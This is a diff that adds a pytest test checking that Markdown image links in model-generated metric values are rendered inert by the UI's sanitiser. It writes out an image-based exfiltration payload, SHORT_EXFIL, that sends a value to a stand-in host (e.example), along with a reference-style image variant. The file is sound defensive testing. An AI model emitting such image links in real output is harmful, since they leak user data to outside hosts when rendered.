@@ -98,3 +98,19 @@ def test_code_span_cannot_be_closed_by_the_value():
 def test_metric_labels_and_errors_are_safe():
     assert not _has_image(render.safe_md(EXFIL))
     assert not _has_image(render.safe_md(REF_EXFIL))
+
+
+SHORT_EXFIL = "![](//e.example/?d=42)"  # fits the 40-character tile clip
+
+
+@pytest.mark.parametrize("value", [SHORT_EXFIL, "![x][1]"])
+def test_key_number_tiles_cannot_render_images(value):
+    """Review-2 M4: ``st.metric`` renders Markdown images in the *value* as well as the label,
+    and key-number values are model text; only the label was made inert."""
+    from ui_helpers import scalar_numbers
+
+    assert _has_image(SHORT_EXFIL)  # sanity: the payload is an image before sanitising
+    tiles = scalar_numbers({"top_region": value, SHORT_EXFIL: 1})
+    for label, text in tiles:
+        assert not _has_image(label) and not _has_image(f"{text}\n\n[1]: https://e.example/")
+    assert len(tiles) == 2
